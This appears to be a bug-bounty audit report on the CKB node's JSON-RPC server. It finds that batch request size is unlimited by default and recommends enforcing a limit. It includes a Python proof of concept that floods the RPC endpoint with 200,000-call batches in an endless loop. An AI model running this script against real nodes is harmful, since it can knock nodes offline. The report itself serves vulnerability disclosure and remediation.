Audit Report

## Title
No Default Enforcement of JSON-RPC Batch Request Size Limit Enables Resource Exhaustion - (File: `rpc/src/server.rs`)

## Summary
The CKB JSON-RPC server ships with `rpc_batch_limit` set to `None` by default, meaning the batch-size guard in `handle_jsonrpc` is never evaluated unless an operator explicitly opts in. Any caller with access to the RPC endpoint can submit a single JSON-RPC batch request containing an arbitrarily large number of calls (bounded only by the 10 MiB body limit), causing unbounded CPU and memory consumption that can degrade or halt block processing, transaction relay, and peer synchronization.

## Finding Description
`rpc_batch_limit` is declared as `Option<usize>` with no default value and no `#[serde(default)]` fallback: [1](#0-0) 

At server startup, `JSONRPC_BATCH_LIMIT` is only populated when the operator explicitly sets the option: [2](#0-1) 

In `handle_jsonrpc`, the guard is conditional on the static being set. When `JSONRPC_BATCH_LIMIT` is `None` (the default), the `if let Some(...)` arm is never entered and all calls proceed unconditionally: [3](#0-2) 

The shipped default configuration explicitly leaves the limit commented out: [4](#0-3) 

The only upstream guard is `max_request_body_size = 10485760` (10 MiB). Within a 10 MiB body, a caller can pack approximately 200,000 minimal JSON-RPC calls (e.g., `get_tip_block_number` at ~50 bytes each). Every call is dispatched through `io.handle_call`, which involves deserialization, dispatch, and response serialization — all executed sequentially in the async stream. The test harness itself acknowledges the need for a limit by explicitly setting `rpc_batch_limit: Some(1000)`: [5](#0-4) 

## Impact Explanation
A single crafted HTTP POST causes the node to process hundreds of thousands of RPC calls. This exhausts CPU and memory, degrading or halting block processing, transaction relay, and peer synchronization for the duration of the attack. Repeated in a loop, it causes sustained node unavailability. This matches the allowed CKB bounty impact: **High — Vulnerabilities which could easily crash a CKB node** (10001–15000 points).

## Likelihood Explanation
The RPC endpoint defaults to `127.0.0.1:8114` (localhost). Any unprivileged process on the same host — scripts, web applications, or other co-located services — qualifies as an attacker. No authentication, key, or privileged role is required. The attack requires a single HTTP request and is repeatable at negligible cost. Operators who expose the RPC port to a broader network (explicitly warned against but common in practice) face the same attack from any network-reachable client. **Likelihood: Medium** by default; elevated to High if the port is exposed.

## Recommendation
1. Set a safe non-`None` default for `rpc_batch_limit` in the `Config` struct (e.g., 100–500 calls) so the limit is enforced without operator action.
2. Enforce the limit unconditionally in `handle_jsonrpc` rather than only when the static is populated.
3. Apply the batch limit to the TCP and WebSocket RPC paths, which share the same `handle_jsonrpc` handler but may have different framing limits.

## Proof of Concept
```python
import json, requests

# Craft a batch of 200,000 lightweight calls within the 10 MiB body limit
calls = [{"jsonrpc":"2.0","method":"get_tip_block_number","params":[],"id":i}
         for i in range(200_000)]
body = json.dumps(calls)          # ~9.8 MiB, under the 10 MiB limit
assert len(body.encode()) < 10 * 1024 * 1024

# Single request; no authentication required
r = requests.post("http://127.0.0.1:8114", data=body,
                  headers={"Content-Type": "application/json"})
# Node CPU pegged; response delayed by seconds to minutes
print(r.status_code, len(r.json()))

# Repeat in a loop for sustained exhaustion
while True:
    requests.post("http://127.0.0.1:8114", data=body,
                  headers={"Content-Type": "application/json"})
```

With `rpc_batch_limit` unset (the default), the node processes all 200,000 calls per request. The `TimeoutLayer` (30 s) limits each individual request but does not prevent the attack from being repeated continuously, sustaining resource exhaustion indefinitely.

### Citations

**File:** util/app-config/src/configs/rpc.rs (L43-44)
```rust
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
```

**File:** rpc/src/server.rs (L53-55)
```rust
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** rpc/src/tests/setup.rs (L184-184)
```rust
        rpc_batch_limit: Some(1000),
```
